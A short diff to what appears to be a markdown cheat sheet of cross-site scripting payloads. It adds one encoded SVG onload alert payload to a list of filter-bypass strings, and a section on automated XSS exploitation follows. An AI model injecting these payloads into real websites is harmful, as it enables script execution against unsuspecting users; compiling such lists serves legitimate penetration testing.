@@ -40,6 +40,7 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 "><input %00 onControl hello oninput=confirm(domain) x>
 ";alert(document.domain);/
 *;var%20dk4trin="*/";
+<svg onload=alert%26%230000000040"1")>
 ```
 
 #### XSS Auto Bash Exploitation :
